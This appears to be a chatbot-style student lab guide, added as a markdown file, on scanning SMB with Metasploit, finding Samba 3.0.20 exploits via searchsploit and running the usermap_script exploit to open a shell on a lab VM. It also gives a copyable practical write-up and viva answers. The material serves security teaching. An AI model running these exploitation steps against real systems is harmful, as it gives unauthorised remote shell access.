@@ -1,0 +1,238 @@
+Alright 😄 let’s do **Practical No. 7** — this one sounds scary, but it’s actually **command-based + very scoring** in exams.
+
+---
+
+## 🧪 Practical No. 7
+
+### **Using Metasploit Framework for Exploitation**
+
+---
+
+## ✅ Aim
+
+To perform **system enumeration and exploitation** using the **Metasploit Framework**.
+
+
+
+---
+
+## 🛠 Tool Used
+
+* **Metasploit Framework**
+* OS: **Kali Linux**
+
+---
+
+## STEP 1️⃣: Start Kali Linux
+
+1. Open **VirtualBox**
+2. Start **Kali Linux**
+3. Login normally
+
+---
+
+## STEP 2️⃣: Open Metasploit Console
+
+![Image](https://www.varonis.com/hubfs/Imported_Blog_Media/metasploit-help-command.png?hsLang=en)
+
+![Image](https://www.offsec.com/_astro/msfconsolehelp-2_ZM0D9Q.webp)
+
+![Image](https://docs.rapid7.com/images/metasploit/msfproconsole.png)
+
+Open **Terminal** and type:
+
+```bash
+msfconsole
+```
+
+⏳ It may take a minute to load.
+
+When you see:
+
+```text
+msf6 >
+```
+
+✅ Metasploit is ready.
+
+---
+
+## STEP 3️⃣: Use SMB Version Scanner Module
+
+### Command:
+
+```bash
+use auxiliary/scanner/smb/smb_version
+```
+
+Then:
+
+```bash
+show options
+```
+
+---
+
+## STEP 4️⃣: Set Target IP Address
+
+You’ll see `RHOSTS` is empty.
+
+### First find target IP:
+
+```bash
+ip a
+```
+
+Example:
+
+```text
+192.168.56.102
+```
+
+### Set target:
+
+```bash
+set RHOSTS 192.168.56.102
+```
+
+Verify:
+
+```bash
+show options
+```
+
+---
+
+## STEP 5️⃣: Run the Scan
+
+```bash
+run
+```
+
+or
+
+```bash
+exploit
+```
+
+---
+
+## 📌 Observation
+
+* SMB service version detected
+* Vulnerable services identified
+* System information displayed
+
+---
+
+## STEP 6️⃣: Search Exploits Using Searchsploit
+
+![Image](https://www.kali.org/docs/nethunter/nethunter-searchsploit/nethunter-searchsploit.png)
+
+![Image](https://www.exploit-db.com/images/searchsploit-v3.png)
+
+![Image](https://www.offsec.com/app/uploads/2022/11/Exploit-DB-Update-Blog-post-1-e1671811452227-860x450.png)
+
+Open **new terminal** and type:
+
+```bash
+searchsploit samba | grep 3.0.20
+```
+
+👉 Lists known exploits for that Samba version.
+
+---
+
+## STEP 7️⃣: Use Exploit Inside Metasploit (Demo)
+
+Back to **msfconsole**:
+
+```bash
+search samba
+```
+
+Select exploit (example):
+
+```bash
+use exploit/multi/samba/usermap_script
+```
+
+Check options:
+
+```bash
+show options
+```
+
+Set target again:
+
+```bash
+set RHOSTS 192.168.56.102
+```
+
+Run:
+
+```bash
+exploit
+```
+
+---
+
+## 📌 Result You May See
+
+* Session opened
+* Command shell access (in lab environment)
+
+⚠️ In exams, **even scanning output is enough**.
+
+---
+
+## ✍️ Write This in Practical File (COPY THIS)
+
+### **Aim:**
+
+To perform exploitation using Metasploit Framework.
+
+### **Tool Used:**
+
+Metasploit Framework
+
+### **Procedure:**
+
+1. Started Kali Linux virtual machine.
+2. Launched Metasploit Framework using msfconsole.
+3. Used SMB version scanner module.
+4. Set target IP address.
+5. Ran scan to detect vulnerable services.
+6. Searched for related exploits using searchsploit.
+
+### **Result:**
+
+Target system vulnerabilities were successfully identified using Metasploit Framework.
+
+---
+
+## 🔥 Viva-Ready Questions
+
+**Q. What is Metasploit?**
+👉 A penetration testing framework used to exploit vulnerabilities.
+
+**Q. What is auxiliary module?**
+👉 Used for scanning and enumeration.
+
+**Q. What is RHOSTS?**
+👉 Remote target IP address.
+
+**Q. Difference between exploit and auxiliary?**
+👉 Exploit gains access, auxiliary only scans.
+
+---
+
+## ✅ Practical No. 7 COMPLETED 💯
+
+Next?
+
+* 👉 **Practical No. 8 (SQL Injection – very easy & theory-friendly)**
+* 👉 **Only viva revision**
+* 👉 **Full practical quick revision**
+
+Just say **“Practical 8”** 😄
